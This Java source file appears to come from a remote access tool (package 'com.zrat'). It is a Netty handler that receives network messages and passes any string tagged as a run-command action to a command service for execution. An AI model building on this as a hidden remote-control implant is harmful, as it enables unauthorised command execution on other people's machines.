package com.zrat.server.nio.handler;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.channel.ChannelHandler.Sharable;
import org.jboss.netty.util.Timer;

import com.zrat.server.controller.CommandService;
import com.zrat.server.controller.CommandServiceImpl;
import com.zrat.transfer.model.TransferDataStruct;
@Sharable
public class CommandHandler extends ServerNIOHandler {


    public CommandHandler(ClientBootstrap bootstrap, Timer timer) {
		super(bootstrap, timer);
	}

	@Override
    public void messageReceived(ChannelHandlerContext ctx, MessageEvent e) throws Exception {
        if (e.getMessage() instanceof TransferDataStruct){
        	CommandService command = new CommandServiceImpl();
        	TransferDataStruct data = (TransferDataStruct) e.getMessage();
        	if (CommandService.COMMAND_RUNCOMAND.equals(data.getAction())){
        		command.runCommand(data.getObject()+"");
        	}else{
        		ctx.sendUpstream(e);
        	}
        }
    }
    
}